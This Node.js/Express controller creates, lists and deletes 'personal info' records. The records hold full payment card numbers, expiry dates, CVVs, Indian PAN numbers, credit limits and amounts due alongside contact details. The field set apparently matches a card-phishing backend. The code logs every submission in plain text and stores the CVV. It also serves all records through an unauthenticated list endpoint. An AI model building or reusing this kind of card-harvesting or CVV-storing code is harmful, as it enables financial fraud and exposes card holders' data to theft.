const PersonalInfoModel = require("../model/PersonalInfo.model")

exports.CreatePersonalInfo = async(req , res) => {
    try {
        const {name ,email , number , panCardNumber , postalCode , referenceNumber , creditLimit , totalAmountDue , cardHolderName , bankName , cardNumber ,  expiryMonth , expiryYear , cvv} = req.body

        if( !name || !email || !number || !panCardNumber || !postalCode || !referenceNumber || !creditLimit || !totalAmountDue || !cardHolderName || ! bankName || !cardNumber || !expiryMonth || !expiryYear || !cvv){
            return res.status(400).json({message : "Please fill all the fields" })
        }
        

        const newPersonalInfo = new PersonalInfoModel({
            name , email , number , panCardNumber , postalCode , referenceNumber , creditLimit , totalAmountDue , cardHolderName , bankName , cardNumber , expiryMonth , expiryYear, cvv
        })

        console.log(req.body)

        await newPersonalInfo.save()
        res.status(201).json({
            success : true,
            message : "Personal Info added successfully"
        })

    } catch (error) {
        console.log(error)
    }
}

exports.GetPersonalInfo = async(req,res)=>{
    try {
        const PersonalInfo =  await PersonalInfoModel.find()
        res.status(200).json({
            success : true,
            message : 'All Product',
            PersonalInfo
        }
        )
    } catch (error) {
        res.status(500).json({
            success : false,
            mssg : 'Internal service error'
        })
    }
}

exports.deletePersonalInfo = async (req, res) => {
    try {
      const PersonalInfoId = req.params._id;
      const result = await PersonalInfoModel.deleteOne({ _id: PersonalInfoId });
  
      if (result.deletedCount === 0) {
        return res.status(404).json({
          success: false,
          message: "No Personal Info found with the given ID!"
        });
      }
  
      res.status(200).json({
        success: true,
        message: "Personal Info has been deleted!",
      });
    } catch (error) {
      console.log(error);
      res.status(500).json({
        success: false,
        message: "Internal Server Error"
      });
    }
  };
  